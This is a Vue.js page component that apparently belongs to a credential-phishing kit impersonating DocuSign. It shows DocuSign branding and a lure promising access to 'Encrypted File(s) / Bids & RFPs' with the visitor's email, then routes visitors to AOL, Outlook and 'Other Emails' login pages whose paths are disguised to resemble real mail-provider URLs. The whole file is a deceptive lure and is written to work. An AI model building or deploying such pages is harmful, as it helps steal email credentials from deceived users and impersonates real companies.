<template>
    <div>
        <div class="top-bar hidden-sm-and-down">
 <p class="bar-title">Docusign</p>
 <v-icon class="bar-title">mdi-ray-start-arrow</v-icon>
  <p class="bar-title">Select Your Email Provider</p>
   <v-btn style="float: right" color="pink" dark>Subcribe</v-btn>
        </div>
        <div>
            <v-row no-gutters>
                <v-col cols="12" sm="1" md="1" class="site-col-1 hidden-sm-and-down">
                    <center>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-menu</v-icon>
                       </v-btn>
                       <br><br>
                        <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-home</v-icon>
                       </v-btn>
                       <br><br>
                        <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-crown</v-icon>
                       </v-btn>
                       <br><br>
                        <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-star</v-icon>
                       </v-btn>
                       <br><br>
                       <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-file-document-box-check</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-file-document-box-multiple</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-file-document-edit</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-account-card-details</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-cloud-lock</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-account-group</v-icon>
                       </v-btn>
                       <br><br>
                         <v-btn icon>
                      <v-icon style="font-size:26px;" color="white">mdi-logout</v-icon>
                       </v-btn>

                    </center>
               
                </v-col>
                <v-col cols="12" sm="11" md="11" class="site-col-2">
                <v-toolbar color="white" flat class="tool-bar" >
          <img src="https://www.satuit.com/images/default-source/default-album/docusign-logo.png?sfvrsn=e8438f89_1" alt="" height="30px">
          <v-spacer></v-spacer>
          <v-btn icon>
            <v-icon color="#a0a2a7">mdi-apps</v-icon>
          </v-btn>
          <v-btn icon>
            <v-icon color="#a0a2a7">mdi-help</v-icon>
          </v-btn>
          <v-btn icon>
            <v-icon color="#a0a2a7">mdi-settings</v-icon>
          </v-btn>
           <v-btn icon>
            <v-icon color="#a0a2a7">mdi-bell</v-icon>
          </v-btn>
          <v-btn icon>
             <v-avatar color="#16325c">
      <v-icon color="white">mdi-account-circle</v-icon>
    </v-avatar>
          </v-btn>
        </v-toolbar>
        <div class="provider">
         <p class="provider-h">Access Encrypted File(s) / Bids & RFPs Information With Your Email</p>
         <p class="provider-p">3 apps</p>
         <br>
         <v-row>
             <v-col  cols="12" sm="12" md="3" class="provider-col">
               
                
                  
         <router-link to="/login-aol-com-src-ym&-lang-en-US&-intl-us&-done-mail.aol.com">    <v-card class="provider-card-aol" flat>
                 <center>
                      <img src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png" alt="" height='35px'>
                 </center>
             </v-card>  </router-link>
             <center><p style="color:#1462d8;margin-top:5px;font-size:15px;">AOL</p></center>
             </v-col>
             <v-col cols="12" sm="12" md="3" class="provider-col">
              <router-link to="/live-office-account-com-src-ym&-lang-en-US&-intl-us&-done-mail.office.com"> <v-card class="provider-card-office" flat>
                 <center>
                      <img src="../assets/office.png" alt="" height='100px'>
                 </center>
             </v-card></router-link>
             <center><p style="color:#1462d8;margin-top:5px;font-size:15px;">Outlook</p></center>
             </v-col>
             <v-col cols="12" sm="12" md="3" class="provider-col">
            <router-link to="/login-docusign-com-src-ym&-lang-en-US&-intl-us&-done-mail.docusign.com">  <v-card class="provider-card-others" flat>
                 <center>
                      <img src="https://www.vippng.com/png/detail/133-1334155_twitter-light-blue-mail-icon.png" alt="" height='100px'>
                 </center>
             </v-card></router-link>
             <center><p style="color:#1462d8;margin-top:5px;font-size:15px;">Other Emails</p></center>
             </v-col>
         </v-row>
        </div>
                </v-col>
            </v-row>
        </div>
    </div>
</template>

<script>
export default {
    
}
</script>

<style scoped>
.top-bar {background: #102442;padding:18px; color: white;}
.bar-title {text-decoration: none; display: inline-block;color:white; margin: 0px 8px;font-size: 14px;}
.bar-title:hover{ text-decoration: underline; display: inline-block;color:white; margin: 0px 8px;font-size: 14px;}
.site-col-1 {background: #16325c;height: 100vh; padding: 30px 0px;}
.site-col-2 {background: #f4f6f9; padding: 0px 0px;height: 100vh;}
.tool-bar {box-shadow: 10px 2px 5px 0px #f0f0f0;padding: 0px 20px 0px 0px;}
.provider { padding: 50px 100px;}
.provider-col { margin-right:20px;}
.provider-card-aol {border:1px solid rgb(216, 221, 230); height: 200px; padding: 70px 0px 0px 0px; }
.provider-card-aol:hover {border:1px solid #1462d8; height: 200px; padding: 70px 0px 0px 0px; }
.provider-card-office {border:1px solid rgb(216, 221, 230); height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-office:hover {border:1px solid #1462d8; height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-others {border:1px solid rgb(216, 221, 230); height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-others:hover {border:1px solid #1462d8; height: 200px; padding: 50px 0px 0px 0px; }
.provider-h { font-size:30px; color: #102442;}
.provider-p { font-size:14px; color: #102442;}

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
        .top-bar {background: #102442;padding:18px; color: white;}
.bar-title {text-decoration: none; display: inline-block;color:white; margin: 0px 8px;font-size: 14px;}
.bar-title:hover{ text-decoration: underline; display: inline-block;color:white; margin: 0px 8px;font-size: 14px;}
.site-col-1 {background: #16325c;height: 100vh; padding: 30px 0px;}
.site-col-2 {background: #f4f6f9; padding: 0px 0px;height: auto;}
.tool-bar {box-shadow: 10px 2px 5px 0px #f0f0f0;padding: 0px 20px 0px 0px;}
.provider { padding: 30px 20px;}
.provider-col { margin-right:20px;}
.provider-card-aol {border:1px solid rgb(216, 221, 230); height: 200px; padding: 70px 0px 0px 0px; }
.provider-card-aol:hover {border:1px solid #1462d8; height: 200px; padding: 70px 0px 0px 0px; }
.provider-card-office {border:1px solid rgb(216, 221, 230); height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-office:hover {border:1px solid #1462d8; height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-others {border:1px solid rgb(216, 221, 230); height: 200px; padding: 50px 0px 0px 0px; }
.provider-card-others:hover {border:1px solid #1462d8; height: 200px; padding: 50px 0px 0px 0px; }
.provider-h { font-size:20px; color: #102442;}
.provider-p { font-size:14px; color: #102442;}
    }
</style>
